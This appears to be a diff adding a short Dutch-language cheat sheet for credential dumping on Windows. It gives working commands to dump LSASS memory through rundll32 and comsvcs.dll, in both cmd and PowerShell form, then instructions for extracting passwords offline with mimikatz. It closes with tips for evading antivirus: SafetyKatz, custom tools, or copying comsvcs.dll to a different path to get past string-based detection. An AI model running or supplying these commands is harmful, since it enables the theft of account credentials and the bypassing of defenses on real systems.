@@ -1,0 +1,13 @@
+# LSASS MiniDump via comsvcs.dll (geen extra tools nodig)
+# Vereiste: Local admin / SeDebugPrivilege
+# Stap 1: Vind LSASS PID
+tasklist /fi "imagename eq lsass.exe"
+# Stap 2: Dump via rundll32 + comsvcs.dll
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump LSASS_PID C:\Windows\tasks\lsass.dmp full
+# PowerShell variant:
+powershell -c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\tasks\lsass.dmp full"
+# Stap 3: Download dump en extract credentials offline
+# Op aanvaller: mimikatz # sekurlsa::minidump lsass.dmp
+# mimikatz # sekurlsa::logonpasswords
+# Tip: AV detecteert vaak comsvcs.dll dumps - overweeg SafetyKatz of custom tool
+# Tip: Kopieer comsvcs.dll naar ander pad om string-based detectie te omzeilen
